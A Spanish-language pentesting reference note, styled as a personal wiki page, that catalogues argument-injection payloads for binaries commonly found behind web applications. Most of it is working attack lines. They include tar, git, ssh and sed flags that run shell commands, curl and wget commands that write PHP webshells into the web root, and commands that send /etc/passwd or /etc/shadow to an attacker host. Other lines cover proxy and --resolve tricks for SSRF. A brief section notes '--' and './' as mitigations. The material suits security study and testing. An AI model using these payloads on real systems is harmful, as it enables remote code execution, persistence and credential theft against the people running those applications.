---
tipo: meta
aliases:
  - GTFOArgs
  - Flags abusables
tags:
  - meta/referencia
  - dominio/web
---

# Argument injection - matriz de referencia

> [!info] Referencia pura, no un zettel
> Qué flag pedirle a cada binario cuando se controla un argumento pero no se puede romper el comando. El criterio vive en [[Argument injection - abuso de flags]]; la definición, en [[CWE-88 - Argument Injection]].
>
> Corpus externo de referencia: [GTFOArgs](https://gtfoargs.github.io/). Acá van solo los casos que aparecen detrás de aplicaciones web.

## 0. Detectar qué binario hay detrás

`--version`
`--help`
Si el argumento cae en primera posición, la respuesta suele identificar el binario y la versión.

`-`
`--`
Un guion suelto y un doble guion. Los mensajes de error cambian según el parser: `getopt` de GNU, `argparse` de Python y los parsers artesanales fallan distinto.

`/etc/passwd`
`../../../etc/passwd`
Si el argumento es una ruta y el contenido aparece o cambia el error, hay lectura antes que ejecución.

## 1. Ejecución directa

Los binarios que aceptan un comando como valor de flag. Es el camino más corto de argument injection a RCE.

`tar cf /dev/null x --checkpoint=1 --checkpoint-action=exec=sh`
`tar`. La pareja `--checkpoint` + `--checkpoint-action=exec=` es la primitiva más conocida del dominio.

`tar cf /dev/null x --use-compress-program=/bin/sh`
`tar` alternativo, más corto. También `-I /bin/sh`.

`tar xf a.tar --to-command='sh -c id'`
`tar` al extraer: ejecuta el comando por cada miembro del archivo.

`zip a.zip f -T -TT 'sh #'`
`zip`. `-TT` fija el comando de verificación; el `#` descarta lo que `zip` anexa.

`git -c core.pager='sh -c id' log`
`git`. Cualquier subcomando que pagine sirve. También `-c core.sshCommand=` y `--upload-pack=` en `clone`/`ls-remote`.

`ssh -o ProxyCommand='sh -c id' x`
`ssh`. También `-o PermitLocalCommand=yes -o LocalCommand=id`.

`rsync -e 'sh -c id' x localhost:`
`rsync`. `-e` fija el transporte remoto y se ejecuta localmente.

`wget --use-askpass=/bin/sh 0`
`wget`. Ejecuta el programa indicado para pedir credenciales.

`find . -exec sh ; -quit`
`find`, si se controla algo después de la ruta.

`awk 'BEGIN{system("id")}'`
`awk`, cuando el programa es lo controlado.

`sed -e 's/.*/id/e' /etc/hostname`
`sed` de GNU. La bandera `e` del comando `s` ejecuta el resultado como shell.

`php -r 'system("id");'`
`python3 -c 'import os;os.system("id")'`
`perl -e 'system("id")'`
`node -e 'require("child_process").execSync("id")'`
Intérpretes: si el binario detrás es uno de estos y se controla un argumento temprano, es ejecución directa.

`mysql --execute='\! id'`
`mysql`. `\!` es el escape a shell del cliente.

## 2. Escritura de archivos

Sin ejecución directa, escribir en la raíz web y volver a [[Webshell]].

`curl http://atacante/s.php -o /var/www/html/s.php`
`curl`. `-o` / `--output`. La flag más rentable del dominio: convierte una petición saliente en escritura arbitraria.

`curl -K /tmp/conf http://x`
`curl` con archivo de configuración: si además se puede escribir `/tmp/conf`, ahí van `output` y `url` sin flags visibles.

`wget http://atacante/s.php -O /var/www/html/s.php`
`wget`. Mismo efecto con `-O`.

`sed -i 's/x/<?php system($_GET[0]);?>/' /var/www/html/i.php`
`sed`. `-i` edita en sitio: escritura sobre un archivo existente.

`dd of=/var/www/html/s.php`
`dd`. `of=` no empieza con guion, así que pasa validaciones que solo rechazan `-`.

`tee /var/www/html/s.php`
`tee`, si el binario recibe entrada estándar controlada.

## 3. Lectura de archivos

Cuando el techo es leer, no ejecutar.

`curl -d @/etc/passwd http://atacante/`
`curl`. El prefijo `@` lee el archivo como cuerpo de la petición. Exfiltra sin necesitar flag de salida.

`curl --upload-file /etc/passwd http://atacante/`
`curl` por PUT.

`wget --post-file=/etc/passwd http://atacante/`
`wget`.

`grep -f /etc/shadow .`
`grep`. El archivo se lee como lista de patrones; los errores de coincidencia filtran contenido línea a línea.

`ffmpeg -i /etc/passwd out.mp4`
`ffmpeg`. Falla, y el mensaje de error suele incluir las primeras líneas del archivo. También hay lectura vía listas de concatenación y subtítulos.

`convert /etc/passwd out.png`
ImageMagick. Renderiza texto a imagen: el contenido del archivo se vuelve legible en el resultado.

`7z a a.7z -i@/etc/shadow`
`7z`. Trata el archivo como lista de inclusión y reporta cada línea que no existe — o sea, todas.

`zip a.zip -r . -x@/etc/passwd`
`zip`, mismo mecanismo por lista de exclusión.

## 4. Cambio de destino

Ni ejecución ni lectura: redirigir a dónde va el binario.

`curl http://interno:8080/admin --resolve x:80:127.0.0.1`
`curl`. `--resolve` y `--connect-to` desvían la conexión ignorando el nombre — es SSRF a través de un argumento.

`curl -x http://atacante:8080 http://interno/`
`curl` con proxy: todo el tráfico, credenciales incluidas, pasa por el atacante.

`curl -H 'Authorization: Bearer x' http://x`
Cabecera inyectada, si el argumento cae antes de la URL.

`git clone --upload-pack='sh -c id' ssh://x/y`
`git`, ya listado arriba, pero vale por lo frecuente: aparece en cualquier app que clone repositorios de una URL dada por el usuario.

## 5. Posición y bloqueo

`--`
Cierra la lista de opciones: **todo lo posterior es dato**. Si el comando ya lo lleva antes del argumento controlado, no hay nada que hacer con flags.

`-` a secas
Muchos binarios lo interpretan como entrada o salida estándar. Sirve para redirigir sin escribir una ruta.

`./-flag`
Cuando lo controlado es un **nombre de archivo** en el directorio: anteponer `./` es la mitigación; sin ella, un archivo llamado `-o` se lee como flag.

`--flag=valor`
Preferible a `--flag valor` cuando el filtro parte por espacios: es un solo argumento.

## 6. Familias de flags a probar siempre

Frente a un binario desconocido, estas son las que más veces pagan:

```
-o  --output  --out  --write-out
-c  --config  --conf  --rcfile  --defaults-file
-e  --exec  --command  --eval  --pager
-i  --input  --include  --require  --preload
-f  --file  --from-file
--use-*  --*-command  --*-program
```

El patrón general: **cualquier flag que acepte una ruta escribible o un programa a invocar**. Las dos primeras familias dan escritura; la tercera y la última, ejecución.
